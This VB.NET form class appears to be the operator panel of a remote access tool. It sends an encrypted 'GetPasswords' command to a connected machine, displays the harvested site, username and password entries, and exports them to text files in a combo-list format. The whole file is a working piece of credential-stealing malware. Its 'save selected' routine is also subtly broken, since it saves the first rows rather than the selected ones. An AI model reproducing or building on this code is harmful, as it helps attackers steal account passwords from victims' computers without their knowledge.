Public Class paswdrec
    Public connected As Connection
    Private Sub paswdrec_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        connected.Send(New Encryption().AES_Encrypt("GetPasswords", Form1.enckey))
    End Sub
    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        paswdrec_Load(sender, e)
    End Sub
    Private Sub SaveSelectedPasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveSelectedPasswordsToolStripMenuItem.Click
        Try
            Dim sfd As New SaveFileDialog
            With sfd
                .InitialDirectory = Application.StartupPath
                .Title = "Save Selected Passwords..."
                .Filter = "Text Files | *.txt"
            End With

            Dim res = sfd.ShowDialog()

            Dim text As String = String.Empty
            For i = 0 To ListView1.SelectedItems.Count - 1
                text += ListView1.Items.Item(i).SubItems.Item(1).Text & "|" & ListView1.Items.Item(i).SubItems.Item(0).Text & ":" & ListView1.Items.Item(i).SubItems.Item(2).Text & ":" & ListView1.Items.Item(i).SubItems.Item(3).Text & vbCrLf
            Next

            If res = Windows.Forms.DialogResult.OK Then
                IO.File.WriteAllText(sfd.FileName, text)
            End If
        Catch
        End Try
    End Sub
    Private Sub SaveAllPasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveAllPasswordsToolStripMenuItem.Click
        Try
            Dim sfd As New SaveFileDialog
            With sfd
                .InitialDirectory = Application.StartupPath
                .Title = "Save All Passwords..."
                .Filter = "Text Files | *.txt"
            End With

            Dim res = sfd.ShowDialog()

            Dim text As String = String.Empty
            For i = 0 To ListView1.Items.Count - 1
                text += ListView1.Items.Item(i).SubItems.Item(1).Text & "|" & ListView1.Items.Item(i).SubItems.Item(0).Text & ":" & ListView1.Items.Item(i).SubItems.Item(2).Text & ":" & ListView1.Items.Item(i).SubItems.Item(3).Text & vbCrLf
            Next

            If res = Windows.Forms.DialogResult.OK Then
                IO.File.WriteAllText(sfd.FileName, text)
            End If
        Catch
        End Try
    End Sub
End Class